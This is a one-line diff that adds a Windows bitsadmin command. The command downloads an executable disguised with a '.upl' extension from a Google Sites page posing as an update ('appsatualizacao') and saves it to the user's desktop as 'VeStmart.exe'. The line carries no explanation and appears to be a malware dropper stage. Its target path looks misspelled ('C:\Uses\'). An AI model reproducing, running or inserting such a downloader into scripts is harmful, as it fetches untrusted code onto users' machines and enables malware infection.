@@ -1,0 +1,1 @@
+bitsadmin /transfer mydownloadjob /download /priority normal https://sites.google.com/site/appsatualizacao/home/vet/Vet.exe.upl C:\Uses\%username%\Desktop\VeStmart.exe
